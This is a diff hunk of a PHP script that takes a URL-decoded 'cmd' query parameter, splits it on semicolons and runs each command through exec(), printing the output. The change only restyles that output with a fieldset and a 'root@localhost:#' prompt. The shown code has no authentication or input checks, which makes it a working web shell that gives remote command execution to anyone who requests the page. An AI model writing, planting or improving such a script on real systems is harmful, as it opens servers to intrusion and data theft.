@@ -11,14 +11,15 @@
 $command = urldecode(($_GET['cmd']));
 foreach (explode(';', $command) as $cmd){
 	$output = array();
-	echo "Command: {$cmd}";
+	echo '<fieldset style="margin-top:1px;" class="CMD"><legend/>Command:</legend>';
+	echo "root@localhost:# {$cmd}<br>";
 	exec($cmd . ' 2>&1', $output, $retval);
 	$last200 = array_slice($output, -200, 200, true);
 	echo "<p class=\"logLine\">";
 	foreach($last200 as $line){echo "{$line}<br>"; }
 	echo "</p>";
 	echo $retval ?  "The command failed." : "The command finished successfully!";
-	echo "<br><br>";
+	echo "</fieldset><br><br>";
 }
 
 ?>
